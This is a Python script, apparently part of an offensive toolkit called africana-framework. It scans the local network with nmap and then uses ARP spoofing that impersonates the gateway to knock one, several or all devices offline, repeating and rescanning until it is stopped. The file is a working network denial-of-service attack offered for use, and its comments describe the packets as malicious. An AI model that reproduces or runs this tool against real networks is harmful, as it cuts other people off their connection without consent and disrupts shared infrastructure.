#!/usr/bin/env python3

import time
import os
import sys
import math
import spoof
import logging
import requests
import platform
from time import sleep
from datetime import timedelta
from ipaddress import IPv4Address

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, DARKCYAN, BOLD, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[36m', '\033[1m', '\033[0m'

# Shut up scapy!
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

try:
    from scapy.all import *
    import nmap
except ImportError:
    print("\n{0}ERROR: Requirements have not been satisfied properly. Please look at the README file for configuration instructions.".format(RED))
    print("\n{0}If you still cannot resolve this error, please submit an issue here:\n\t{1}https://github.com/r0jahsm0ntar1/africana-framework/issues\n{2}".format(RED, BLUE, END))
    raise SystemExit

# check whether user is root
if os.geteuid() != 0:
    print("\n{0}ERROR: Kickthemout must be run with root privileges. Try again with sudo:\n\t{1}$ sudo python3 kick.py{2}\n".format(RED, GREEN, END))
    raise SystemExit

def heading():
    print(RED + """
                                       ___
             _______                  /__/
            |.-----.|            ,---[___]*
            ||     ||           /    printer
            ||_____||    _____ /        ____
            |o_____*|   [o_+_+]--------[=i==]
             |     ________|           drive
             |  __|_
             '-/_==_\       Jesus Christ is
              /_____\\  The Lamb that was slain
                             for our sins.
                               John 3:16
          __                 _____ _____     _     _
       __|  |___ ___ _ _ ___|     |  |  |___|_|___| |_
      |  |  | -_|_ -| | |_ -|   --|     |  _| |_ -|  _|
      |_____|___|___|___|___|_____|__|__|_| |_|___|_|
""" + END + BLUE +
'\n' + '    {0}Kick devices accesing your network {1}({2}africana-framework{3}){4}\n'.format(YELLOW, GREEN, DARKCYAN, GREEN, GREEN).center(45) + 
'\n' + '     Made With <3 by: {0}r0jahsm0ntar1{3}'.format(BLUE, RED, DARKCYAN, BLUE).center(65) + 
'\n' + '    Version: {0}0.3{1}'.format(YELLOW, END).center(65))

def optionBanner():
    print('{0}             Select a number from the table below         {1}\n'.format(BOLD, END))
    sleep(0.2)
    print('{0}[ 1.                    Kick one off                      ]{1}'.format(BLUE, BLUE))
    sleep(0.2)
    print('{0}[ 2.                    Kick some off                     ]{1}'.format(BLUE, BLUE))
    sleep(0.2)
    print('{0}[ 3.                    Kick all off                      ]{1}'.format(BLUE, BLUE))
    sleep(0.2)
    print('{0}[ 0.           Exit and go back fo main menu              ]{1}\n'.format(BLUE, BLUE))

def vendorMAC(mac):
    url = "http://api.macvendors.com/{}".format(mac)
    response = requests.get(url)
    if response.ok:
        return response.text
    return "NA"

def get_broadcast(gatewayIP):
    *head, tail = gatewayIP.split('.')
    head.append(str(int(tail) - 1))
    gateway = ".".join(head)
    route_list = [i.split() for i in str(conf.route).splitlines()]
    for route in route_list:
        if route[0] == gateway:
            return route[1]

def get_netmask(gateway):
    routing = scapy.config.conf.route.routes
    for i in routing:
        if int(IPv4Address(gateway)) in i:
            netmask = 32 - int(round(math.log(0xFFFFFFFF - (i[1]), 2)))
            return netmask

def net_config():
    global defaultInterface
    global defaultGatewayIP
    global defaultInterfaceIP
    global defaultInterfaceMAC
    global defaultGatewayMac
    global GatewayInterface

    defaultInterface = conf.iface
    defaultInterfaceIP = get_if_addr(defaultInterface)
    defaultInterfaceMAC = get_if_hwaddr(defaultInterface).upper()

    # routing = scapy.config.conf.route.routes
    # defaultGatewayIP = route_list[2][2]
    # defaultInterface,  defaultInterfaceIP,  defaultGatewayIP = conf.route.route("0.0.0.0")[2]

    defaultGatewayIP = conf.route.route("0.0.0.0")[2]
    defaultGatewayMac = getmacbyip(defaultGatewayIP).upper()
    broadcast = get_broadcast(defaultGatewayIP)
    netmask = get_netmask(broadcast)
    GatewayInterface = "{}/{}".format(defaultGatewayIP, netmask)

def scanNetwork():
    nm = nmap.PortScanner()
    scanDict = nm.scan(hosts=GatewayInterface, arguments='-sn')
    scan_data = scanDict['scan']
    scan_stats = scanDict['nmap']['scanstats']
    IPlist = [ip for ip in scan_data.keys() if ip not in [defaultGatewayIP, defaultInterfaceIP]]
    scan_stats['targets'] = len(IPlist)
    hosts_list = []
    for host in IPlist:
        host_dict = {"ip": host}
        mac = scan_data[host]['addresses']['mac']
        host_dict['vendor'] = scan_data[host]['vendor'].get(mac, '')
        host_dict['mac'] = mac
        hosts_list.append(host_dict)
    print_metadata(scan_stats)
    return hosts_list

def print_metadata(scan_stats):
    elapsed_time = float(scan_stats["elapsed"])
    uphosts = int(scan_stats["uphosts"])
    timestr = scan_stats["timestr"]
    targets = scan_stats["targets"]

    print('''                    {}Network scan summary :-\n{}
                Scan runtime : {}{}{}
                Interface    : {}{}{}
                MAC          : {}{}{}
                Gateway IP   : {}{}{}
                uphosts      : {}{}{}
                Target hosts : {}{}{}
           '''.format(YELLOW, WHITE, RED, elapsed_time,
                              WHITE, RED, defaultInterface,
                              WHITE, RED, defaultGatewayMac,
                              WHITE, RED, defaultGatewayIP,
                              WHITE, RED, uphosts,
                              WHITE, RED, targets,
                      END))

def print_hosts(hosts_list):
    print("             {0}No {1}Ip address {2}Mac address {3}Vendor name{4}\n".format(YELLOW, WHITE, RED, GREEN, END))
    for n, host in enumerate(hosts_list, 1):
        print("      {0} [{5}] {1}{6} {2}{7} {3}{8}{4}".format(YELLOW, WHITE, RED, GREEN, END, n, host['ip'], host['mac'], host['vendor']))

# kick one device
def kickoneoff():
    #os.system("clear||cls")
    print("\n                {0}Kick one off{1} is selected...{2}".format(RED, GREEN, END))
    sys.stdout.write("\n{0}              Scanning your network, hang on...{1}\n\r".format(DARKCYAN, END))
    sys.stdout.flush()
    hosts_list = scanNetwork()
    print_hosts(hosts_list)

    while True:
        try:
            choice = int(input("\n                {0}({1}africana:{2}framework:{3}target{4})# {5}".format(GREEN, WHITE, DARKCYAN, RED, GREEN, END))) - 1
            #print("HOST ===", hosts_list)
            target_host = hosts_list[choice]
            target_ip = target_host['ip']
            target_mac =target_host['mac']
            vendor = target_host['vendor']
            break
        except KeyboardInterrupt:
            return
        except:
            print("\n{0}ERROR: Please enter a number from the list!{1}".format(RED, END))

    print("\n  {0}Target:-  {5}{1} - {6}{3}  -  {7}{4} {2}".format(RED,target_ip, END, target_mac, vendor, WHITE, RED, GREEN))
    print("\n      {0}Spoofing has started...& Press CTRL+C keys to stop it {1}".format(BLUE, END))
    print("\n              {1} Kicked {0} - 0ut 0f network{2}\n".format(target_ip, RED, END))

    start = time.time()
    try:
        while True:
            # broadcast malicious ARP packets (10p/s)
            spoof.sendPacket(defaultInterfaceMAC, defaultGatewayIP, target_ip, target_mac)
            elapsed = timedelta(seconds=round(time.time() - start))
            print("\r               {0}Attack duration :- {1} seconds{2}".format(YELLOW, elapsed, END), end="")
            time.sleep(5)
    except KeyboardInterrupt:
        return

# kick multiple devices
def kicksomeoff():
    #os.system("clear||cls")
    print("\n                {0}Kick some off{1} is selected...{2}".format(RED, GREEN, END))
    sys.stdout.write("\n{0}              Scanning your network, hang on...{1}\r".format(DARKCYAN, END))
    sys.stdout.flush()
    hosts_list = scanNetwork()
    print_hosts(hosts_list)

    while True:
        try:
            header = ('\n             {0}({1}africana:{2}Choose target{3}(ex. 1, 2){4}# {5}'.format(GREEN, WHITE, RED, DARKCYAN, GREEN, END))
            choice = input(header)
            if ',' in choice:
                some_targets = [int(i.strip()) - 1 for i in choice.split(",")]
                print("\n                    Selected devices are:\n")
                for i in some_targets:
                    print("                        ", hosts_list[i]['ip'])
                break
        except KeyboardInterrupt:
            return
        except ValueError:
            print("\n                          {}Enter comma separated above devices number\n{}".format(RED, END))

    print("\n    {0}Spoofing has started...& Press CTRL+C keys to stop it {1}\n".format(BLUE, END))
    print("\n                    {0}Kick all out of network {1}\n".format(RED, END))
    try:
        start = time.time()
        while True:
            # broadcast malicious ARP packets (10p/s)
            for i in some_targets:
                target_host = hosts_list[i]
                target_ip = target_host['ip']
                target_mac =target_host['mac']
                spoof.sendPacket(defaultInterfaceMAC, defaultGatewayIP, target_ip, target_mac)
                elapsed = timedelta(seconds=round(time.time() - start))
            print("\r             {0}Attack duration :- {1} seconds{2}".format(YELLOW, elapsed, END), end="")
            time.sleep(5)
    except KeyboardInterrupt:
        return

# kick all devices
def kickalloff():
    #os.system("clear||cls")
    print("\n                  {0}Kick all off{1} is selected...{2}".format(RED, GREEN, END))
    sys.stdout.write("\n{0}               Scanning your network hang on...{1}\n".format(DARKCYAN, END))
    sys.stdout.flush()
    hosts_list = scanNetwork()
    print_hosts(hosts_list)
    print("\n      {0}Soofing has started...& Press CTRL+C keys to stop it {1}\n".format(BLUE, END))
    print("\n                 {0}Kicking all out of network {1}\n".format(RED, END))
    try:
        # broadcast malicious ARP packets (10p/s)
        start = time.time()
        reScan = 0
        while True:
            for i in range(len(hosts_list)):
                target_host = hosts_list[i]
                target_ip = target_host['ip']
                target_mac =target_host['mac']
                spoof.sendPacket(defaultInterfaceMAC, defaultGatewayIP, target_ip, target_mac)
                elapsed = timedelta(seconds=round(time.time() - start))
            print("\r             {0}Attack duration :- {1} seconds{2}\n".format(YELLOW, elapsed, END), end="")
            reScan += 1
            if reScan == 4:
                reScan = 0
                scanNetwork()
            time.sleep(5)
    except KeyboardInterrupt:
        return

# script's main function
def main():
    ip_mac_vendor = scanNetwork()
    # display warning in case of no active hosts
    if len(ip_mac_vendor) == 0:
        print("\n{}WARNING: There are no other uphosts on LAN .. Try again {}\n".format(RED, END))
        raise SystemExit

    while True:
        optionBanner()
        header = ('                  {0}({1}africana:{2}framework:{3})# {4}'.format(GREEN, WHITE, DARKCYAN, GREEN, END))
        choice = input(header)
        if choice == '0' or choice.upper() == 'E' or choice.upper() == 'EXIT':
            os.system('clear||cls')
            raise SystemExit
        elif choice == '1':
            kickoneoff()
            os.system("clear||cls")
            heading()
        elif choice == '2':
            kicksomeoff()
            os.system("clear||cls")
            heading()
        elif choice == '3':
            kickalloff()
            os.system("clear||cls")
            heading()
        else:
            print("\n{0}ERROR: Please select a valid option.{1}\n".format(RED, END))
            os.system('clear||cls')
            heading()

if __name__ == '__main__':
    try:
        heading()
        sys.stdout.write("\n{0}              Scanning your network, hang on...{1}\n\r".format(DARKCYAN, END))
        net_config()
        main()
    except KeyboardInterrupt:
        os.system("clear||cls")
        raise SystemExit
